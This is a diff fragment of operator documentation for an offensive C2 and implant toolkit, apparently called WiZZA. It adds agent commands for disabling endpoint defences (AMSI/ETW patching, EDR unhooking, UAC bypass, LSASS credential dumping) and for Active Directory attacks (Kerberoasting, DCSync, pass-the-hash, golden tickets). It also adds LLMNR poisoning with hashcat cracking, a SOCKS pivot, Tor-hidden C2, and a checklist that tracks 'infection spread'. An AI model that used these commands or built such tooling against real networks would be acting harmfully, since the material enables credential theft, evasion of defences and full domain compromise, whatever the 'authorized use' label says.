+
+```bash
+# EDR bypass (send to Windows agent)
+AMSI_BYPASS          # Patch AMSI
+ETW_BYPASS           # Patch ETW  
+NTDLL_UNHOOK         # Remove EDR hooks
+UAC_BYPASS           # Elevate to admin
+LSASS_DUMP           # Dump creds
+
+# Active Directory
+AD_ENUM <dc> <domain> <user> <pass>
+KERBEROAST <dc> <domain> <user> <pass>
+DCSYNC <dc> <domain> <user> <pass>
+PASS_THE_HASH <target> <domain> <user> <hash>
+BLOODHOUND <dc> <domain> <user> <pass>
+
+# PTY shell
+PTY_START            # Spawn interactive shell
+# -> https://localhost:8888/pty/<aid>/term
+
+# SOCKS5 proxy
+PROXY_START          # Start pivot relay
+# -> proxychains [tool] ...
+
+# LLMNR capture
+start llmnr start
+start llmnr hashes
+hashcat -m 5600 hashes.txt rockyou.txt
+```
+
 ## Port Reference
 
 | Port | Service |
@@ -1397,6 +2133,10 @@ gcc -o pwnkit_trigger pwnkit.c && \
 | :8080 | MitM proxy (mitmproxy) |
 | :8083 | MitM reverse proxy tunnel |
 | :9999 | Keystroke catcher |
+| :1080 | SOCKS5 proxy pivot |
+| :137 | NBT-NS poisoner |
+| :445 | Fake SMB (NTLMv2 capture) |
+| :5355 | LLMNR poisoner |
 | :4444 | Default shellcode listener (msfvenom) |
 
 ## File Locations
@@ -1443,6 +2183,14 @@ gcc -o pwnkit_trigger pwnkit.c && \
 
 **Windows:** `INJECT <b64_shellcode>`, `RUN_PS <code>`
 
+**EDR/Evasion (Windows):** `AMSI_BYPASS`, `ETW_BYPASS`, `NTDLL_UNHOOK`, `UAC_BYPASS`, `IMPERSONATE_SYSTEM`, `LSASS_DUMP`, `WMI_PERSIST`, `COM_HIJACK`
+
+**Active Directory:** `AD_ENUM <dc> <domain> <user> <pass>`, `KERBEROAST <dc> <domain> <user> <pass>`, `AS_REP_ROAST <dc> <domain> <users_file>`, `DCSYNC <dc> <domain> <user> <pass> [target]`, `BLOODHOUND <dc> <domain> <user> <pass>`, `PASS_THE_HASH <target> <domain> <user> <hash> [cmd]`, `GOLDEN_TICKET <domain> <sid> <krbtgt_hash> [user]`
+
+**PTY Shell:** `PTY_START`, `PTY_STOP`
+
+**SOCKS5 Pivot:** `PROXY_START`, `PROXY_STOP`
+
 **Shell:** any other text -> treated as shell command and executed via `cmd.exe /c` (Windows) or `bash -c` (Linux)
 
 ## Appendix C — Dependencies Summary
@@ -1459,6 +2207,11 @@ gcc -o pwnkit_trigger pwnkit.c && \
 | `bettercap` | `apt install bettercap` | DNS spoof (physical) |
 | `openssl` | system | Certificate generation |
 | `gcc` | system | Kernel exploit compilation |
+| `impacket` | `pip install impacket` | AD attacks (Kerberoast/DCSync/PTH) |
+| `ldap3` | `pip install ldap3` | LDAP spray, AD enumeration |
+| `bloodhound` | `pip install bloodhound` | BloodHound collection |
+| `tor` | `apt install tor` | Tor hidden service C2 |
+| `torsocks` | `apt install torsocks` | Route tools through Tor |
 
 ## Appendix D — Engagement Checklist
 
@@ -1479,17 +2232,29 @@ gcc -o pwnkit_trigger pwnkit.c && \
 - [ ] `start untrack` — pass stealth audit
 - [ ] `start shellcode gen` — fresh shellcode generated
 - [ ] C2 URL baked into all payloads
+- [ ] `start profile set <name>` — configure malleable C2 profile
+- [ ] `start redirector apache` — set up redirector VPS (if applicable)
 
 **During engagement:**
 - [ ] `start creds` running in separate terminal
 - [ ] C2 panel open at `https://localhost:8888/panel`
 - [ ] `start logs` running for anomaly detection
+- [ ] `start llmnr start` — capture NTLM hashes if on LAN
+- [ ] `start netmap` — monitor infection spread
+
+**Active Directory (if in-scope):**
+- [ ] `AD_ENUM` — enumerate domain
+- [ ] `KERBEROAST` — collect SPN hashes for cracking
+- [ ] `BLOODHOUND` — collect for attack path analysis
+- [ ] `DCSYNC` — replicate credential database after DA achieved
 
 **Post-engagement:**
 - [ ] Send `CLEAN` to all agents
 - [ ] Send `SELFDESTRUCT` to all agents
+- [ ] `start llmnr stop` — stop poisoner
 - [ ] `start down` to stop all local processes
 - [ ] Remove any dropped files from targets
+- [ ] `start report html` — generate engagement report
 - [ ] Archive logs for report
 
 ## Appendix E — Glossary
@@ -1519,6 +2284,29 @@ gcc -o pwnkit_trigger pwnkit.c && \
 | **Polymorphic** | Code that changes its appearance while keeping functionality |
 | **UAF** | Use-After-Free — kernel memory corruption class |
 | **OOB** | Out-Of-Bounds — memory access past buffer boundary |
+| **PTH** | Pass the Hash — authenticate with NTLM hash without cracking |
+| **PTT** | Pass the Ticket — authenticate with Kerberos ticket (.ccache) |
+| **Kerberoasting** | Request TGS tickets for SPN accounts and crack offline |
+| **AS-REP Roasting** | Capture AS-REP for accounts without pre-auth, crack offline |
+| **DCSync** | Replicate AD password database using MS-DRSR protocol |
+| **Golden Ticket** | Forged TGT using krbtgt hash — valid for any user, 10 years |
+| **Silver Ticket** | Forged TGS for a specific service using service account hash |
+| **LLMNR** | Link-Local Multicast Name Resolution — Windows fallback DNS |
+| **NBT-NS** | NetBIOS Name Service — legacy Windows name resolution |
+| **NTLMv2** | Net-NTLMv2 — Windows challenge-response authentication hash |
+| **Responder** | Tool that poisons LLMNR/NBT-NS (WiZZA's llmnr_poison.py is similar) |
+| **Redirector** | VPS that fronts the C2 and filters non-beacon traffic |
+| **Domain fronting** | Routing C2 via CDN to disguise true C2 destination |
+| **SOCKS5** | SOCKS version 5 — proxy protocol for TCP tunneling |
+| **PTY** | Pseudo-Terminal — virtual terminal providing full interactive shell |
+| **SSE** | Server-Sent Events — HTTP streaming from server to browser |
+| **Malleable C2** | C2 with configurable HTTP profiles that mimic legitimate traffic |
+| **BloodHound** | AD attack path analysis tool using graph theory |
+| **SPN** | Service Principal Name — AD service account identifier (Kerberoast target) |
+| **TGT** | Ticket-Granting Ticket — Kerberos initial authentication ticket |
+| **TGS** | Ticket-Granting Service ticket — Kerberos service access ticket |
+| **krbtgt** | Kerberos ticket-granting service account — hash used for Golden Ticket |
+
 ---
 
 *WiZZA Penetration Testing Toolkit — Authorized Use Only*
